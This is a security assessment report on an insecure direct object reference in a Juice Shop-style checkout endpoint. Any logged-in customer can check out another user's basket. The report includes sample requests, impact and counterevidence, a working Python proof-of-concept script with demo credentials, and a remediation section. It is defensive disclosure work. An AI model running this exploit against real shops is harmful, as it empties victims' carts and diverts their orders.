# IDOR: Any authenticated user can check out another user's basket (POST /rest/basket/:id/checkout)

**ID:** vuln-0005
**Severity:** MEDIUM
**Found:** 2026-09-11 19:56:43 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /rest/basket/:id/checkout
**Method:** POST
**CWE:** CWE-639
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

The `POST /rest/basket/:id/checkout` endpoint accepts any basket ID in the URL. A customer JWT holder can check out another user's basket: the victim's basket is emptied and the resulting order is created in the attacker's account. The server authenticates the caller but never verifies that the basket belongs to them.

## Evidence

Attacker A checking out victim B's basket:

```json
POST /rest/basket/7/checkout
Authorization: Bearer <A's customer JWT>

200 OK
{"orderConfirmation":"1531-fb8b8c20545b1aef"}
```

Victim's view afterwards — basket 7 emptied:

```json
GET /rest/basket/7  (as B)
{"data":{"id":7,"UserId":27,"Products":[]}}
```

`GET /rest/order-history` as B: `[]` (no order for the victim). As A: entry `1531-fb8b8c20545b1aef` present. Unauthenticated checkout returns 401. Reproduced twice (first confirmation `1531-cd9aa422bde0be24`).

## Impact

Any customer can (a) destroy another user's in-progress shopping cart by emptying it, and (b) place the victim's selected goods on the attacker's own order. In a real shop this hijacks purchase intent, lets the attacker buy out limited stock the victim had reserved in their cart, and corrupts order attribution.

## Counterevidence

Checked whether checkout merely reads the basket: B's basket verifiably emptied and B's order history stayed empty while A's gained the order — a real state change on B's object. Checked whether the route validates basket ownership at a later step (coupon or orderDetails processing): it does not; an empty body still completes. Checked whether the order was silently assigned back to B: it was not — A's order-history contains it. The only mitigations found (stock limits, quantity caps) do not touch ownership.

## What Would Change This Severity

If checkout could also attach the victim's saved payment card or delivery address to the attacker's order, integrity impact would rise to High.

## Technical Analysis

The checkout handler looks up the basket by the URL parameter and creates an order for the JWT's user against it, without comparing the basket's `UserId` to the token's user. Because the order is created from the token identity while the basket is resolved from the URL, the two principals are effectively mixed: victim B's basket contents become attacker A's order, and B's basket is cleared by the order-creation flow. The same sequential integer IDs as the basket-read IDOR make targeting trivial.

## Proof of Concept

1. Register attacker A and victim B; log in both, capturing JWTs and B's `bid` from the login response. 2. As B, add a product to B's basket so it is non-empty. 3. As A, send `POST /rest/basket/<B's bid>/checkout` with an empty JSON body. 4. Observe `200 {"orderConfirmation": ...}`. 5. As B, request `GET /rest/basket/<B's bid>` — the basket is now empty; `GET /rest/order-history` as B shows no new order, while A's order history contains the confirmation.

```python
import requests

BASE = "http://host.docker.internal:3001"
a = requests.post(BASE + "/rest/user/login", json={"email": "tester.recon@juice-sh.op", "password": "recon123456"}).json()["authentication"]["token"]
b = requests.post(BASE + "/rest/user/login", json={"email": "idor.b.jcgpw4pc@juice-sh.op", "password": "IdorTest123!"}).json()["authentication"]
bid = b["bid"]
requests.post(BASE + "/api/BasketItems", headers={"Authorization": "Bearer " + b["token"]},
              json={"BasketId": bid, "ProductId": 1, "quantity": 2})

# Attacker checks out victim's basket
r = requests.post(f"{BASE}/rest/basket/{bid}/checkout", headers={"Authorization": "Bearer " + a}, json={})
print("checkout:", r.status_code, r.text)
# -> 200 {"orderConfirmation":"1531-..."}

# Victim's basket is now empty
print("victim basket:", requests.get(f"{BASE}/rest/basket/{bid}", headers={"Authorization": "Bearer " + b["token"]}).json()["data"]["Products"])
# -> []
# Order landed in the attacker's history, not the victim's
print("victim history:", requests.get(BASE + "/rest/order-history", headers={"Authorization": "Bearer " + b["token"]}).json()["data"])
# -> []
```

## Remediation

Before processing a checkout, verify the referenced basket belongs to the authenticated user by comparing the path parameter with the basket ID bound to the token (the `bid` claim issued at login), and reject mismatches with 403. Alternatively, ignore the client-supplied basket ID entirely and resolve it server-side from the token, so a checkout can never act on another principal's object.

## Assumptions

Assumes attacker holds any valid customer JWT (free registration). Demo data; in production the victim's selected goods would be purchased on the attacker's account.
